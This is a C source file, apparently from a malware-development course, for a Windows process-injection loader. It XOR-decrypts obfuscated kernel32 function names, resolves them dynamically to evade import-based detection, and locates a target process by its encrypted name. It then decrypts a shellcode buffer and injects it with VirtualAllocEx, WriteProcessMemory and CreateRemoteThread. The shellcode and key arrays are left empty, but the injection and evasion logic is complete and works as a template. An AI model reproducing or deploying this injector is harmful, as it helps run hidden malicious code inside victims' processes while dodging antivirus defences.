/*
@cocomelonc inspired by RTO malware development course
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// shellcode - 64-bit
unsigned char my_payload[] = { };

// encrypted process name
unsigned char my_proc[] = { };

// encrypted functions
unsigned char s_vaex[] = { };
unsigned char s_cth[] = { };
unsigned char s_wfso[] = { };
unsigned char s_wpm[] = { };
unsigned char s_op[] = { };
unsigned char s_clh[] = { };
unsigned char s_p32f[] = { };
unsigned char s_p32n[] = { };

// encrypted kernel32.dll
unsigned char s_k32[] = { };

// length
unsigned int my_payload_len = sizeof(my_payload);
unsigned int my_proc_len = sizeof(my_proc);
unsigned int s_vaex_len = sizeof(s_vaex);
unsigned int s_cth_len = sizeof(s_cth);
unsigned int s_wfso_len = sizeof(s_wfso);
unsigned int s_wpm_len = sizeof(s_wpm);
unsigned int s_op_len = sizeof(s_op);
unsigned int s_clh_len = sizeof(s_clh);
unsigned int s_p32f_len = sizeof(s_p32f);
unsigned int s_p32n_len = sizeof(s_p32n);
unsigned int s_k32_len = sizeof(s_k32);

// keys
char my_payload_key[] = "";
char my_proc_key[] = "";
char f_key[] = "";
char k32_key[] = "";

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
            if (j == key_len - 1) j = 0;

            data[i] = data[i] ^ key[j];
            j++;
    }
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        XOR((char *) s_p32f, s_p32f_len, f_key, sizeof(f_key));
        pProcess32First = GetProcAddress(GetModuleHandle(s_k32), s_p32f);

        XOR((char *) s_p32n, s_p32n_len, f_key, sizeof(f_key));
        pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);

        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }

        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        pCloseHandle(hProcSnap);

        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        // decrypt VirtualAllocEx function call
        XOR((char *) s_vaex, s_vaex_len, f_key, sizeof(f_key));
        pVirtualAllocEx = GetProcAddress(GetModuleHandle(s_k32), s_vaex);
        pRemoteCode = pVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

        // decrypt WriteProcessMemory function call
        XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
        pWriteProcessMemory = GetProcAddress(GetModuleHandle(s_k32), s_wpm);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

        // decrypt CreateRemoteThread function call
        XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
        pCreateRemoteThread = GetProcAddress(GetModuleHandle(s_k32), s_cth);
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);

        if (hThread != NULL) {
                // decrypt WaitForSingleObject function call
                XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
                pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), s_wfso);
                pWaitForSingleObject(hThread, 500);

                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    int pid = 0;
    HANDLE hProc = NULL;

    // decrypt kernel32.dll
    XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));

    // decrypt CloseHandle function call
    XOR((char *) s_clh, s_clh_len, f_key, sizeof(f_key));
    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);

    // decrypt process name
    XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));

    pid = FindTarget(my_proc);

    if (pid) {
        // decrypt OpenProcess function call
        XOR((char *) s_op, s_op_len, f_key, sizeof(f_key));
        pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), s_op);

        // try to open target process
        hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);

        if (hProc != NULL) {
            XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
            Inject(hProc, my_payload, my_payload_len);
            pCloseHandle(hProc);
        }
    }
    return 0;
}
